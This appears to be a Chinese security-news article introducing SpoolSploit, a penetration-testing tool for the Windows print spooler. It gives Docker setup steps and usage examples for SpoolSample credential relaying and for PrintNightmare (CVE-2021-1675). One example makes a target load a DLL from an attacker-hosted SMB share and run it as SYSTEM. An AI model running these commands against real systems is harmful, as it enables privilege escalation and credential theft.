![](https://image.3001.net/images/20211127/1637996162_61a1d682eca59ce702f75.jpg!small)

## 关于SpoolSploit

SpoolSploit是一款针对Windows打印后台处理程序（print
spooler）的安全审计工具，广大研究人员可以使用SpoolSploit检测Windows打印后台处理程序（print
spooler）中存在的安全漏洞，并通过实际的利用技术来进行渗透测试或安全审计。

SpoolSploit中还封装了很多其他的实用工具，以便进行实际的漏洞利用和渗透测试。并实现了两种方法来中继计算机帐户凭据，以升级权限并在具有完全系统访问权限的节点上执行恶意DLL。

## 快速开始

自该项目发布之日起，SpoolSploit Docker容器已在最新版本的macOS、Ubuntu Linux和Windows 10上成功测试。

我们建议广大用户在SpoolSploit
Docker容器内执行渗透测试或凭据中继测试，并托管相应的DLL文件，然后确保运行Docker容器的主机上开启并未使用的445端口。在Windows主机上运行此容器时，这种情况最为普遍，因为默认情况下它使用的是端口445。如果你的主机上端口445已被占用或无法使用的话，可以在网桥模式下配置了网络适配器的虚拟机中运行Docker容器即可。

### 工具下载&访问SpoolSploit容器

 **首先，使用下列命令将该项目源码克隆至本地：**

    
    
    git clone https://github.com/BeetleChunks/SpoolSploit

 **接下来，构建SpoolSploit Docker容器镜像：**

    
    
    cd SpoolSploit
    
    sudo docker build -t spoolsploit .

 **创建并启动SpoolSploit Docker容器：**

    
    
    sudo docker run -dit -p 445:445 --name spoolsploit spoolsploit:latest

 **绑定容器：**

    
    
    sudo docker exec -it spoolsploit /bin/bash

### 命令行使用

    
    
    usage: spool_sploit.py [-h] -a {spoolsample,nightmare} -rH RHOST -rP {139,445} [-lH LHOST] [-lS LSHARE] -d DOMAIN -u USER -p PASSWD
    
    optional arguments:
    
      -h, --help               显示帮助信息并退出
    
      -a {spoolsample,nightmare}, --attack {spoolsample,nightmare}
    
                            需要在目标主机上执行的测试类型
    
      -rH RHOST, --rhost RHOST
    
                            远程目标IP、CIDR范围或文件名 (file:<path>)
    
      -rP {139,445}, --rport {139,445}
    
                            远程SMB服务器端口
    
      -lH LHOST, --lhost LHOST
    
                            监听主机名或IP地址
    
      -lS LSHARE, --lshare LSHARE
    
                            SMB共享 (UNC)
    
      -d DOMAIN, --domain DOMAIN
    
                            身份认证域名
    
      -u USER, --username USER
    
                            身份认证用户名
    
      -p PASSWD, --password PASSWD
    
                            身份认证密码  
    

## 工机使用样例

### 使用样例1

    
    
    python3 spool_sploit.py -a spoolsample -lH 10.14.1.24 -d evil.corp -u rjmcdow -p 'P4ssword123!' -rP 445 -rH 10.5.1.10

### 使用样例2

    
    
    python3 spool_sploit.py -a nightmare -lS '\\10.14.1.24\C$\CreateAdmin.dll' -d evil.corp -u rjmcdow -p 'P4ssword123!' -rP 445 -rH 10.5.1.10

### SpoolSample - Windows设备账号凭证获取和中继

![](https://image.3001.net/images/20211127/1637996241_61a1d6d17ec579fe03e2e.gif!small)

### PrintNightmare (CVE-2021-1675) - 在目标Windows设备上以SYSTEM权限执行恶意DLL

    
    
    sudo docker cp ./malicious.dll spoolsploit:/home/dlogmas/smbserver/share/
    
    sudo docker exec spoolsploit /bin/sh -c 'sudo chown dlogmas:dlogmas /home/dlogmas/smbserver/share/malicious.dll'

![](https://image.3001.net/images/20211127/1637996277_61a1d6f5770d402b61ca8.gif!small)

## 工具使用截图

![](https://image.3001.net/images/20211127/1637996315_61a1d71ba0fb7a2b9fbcf.png!small)

## 项目地址

 **SpoolSploit：** 【[
_GitHub传送门_](https://github.com/BeetleChunks/SpoolSploit)】

## 参考资料

  * [ _https://github.com/lgandx/Responder_](https://github.com/lgandx/Responder)
  * [ _https://github.com/SecureAuthCorp/impacket_](https://github.com/SecureAuthCorp/impacket)
  * [ _https://github.com/leechristensen/SpoolSample_](https://github.com/leechristensen/SpoolSample)
  * [ _https://gist.github.com/3xocyte_](https://gist.github.com/3xocyte)
  * [ _https://github.com/cube0x0_](https://github.com/cube0x0)
  * [ _https://twitter.com/edwardzpeng_](https://twitter.com/edwardzpeng)
  * [ _https://twitter.com/lxf02942370_](https://twitter.com/lxf02942370)

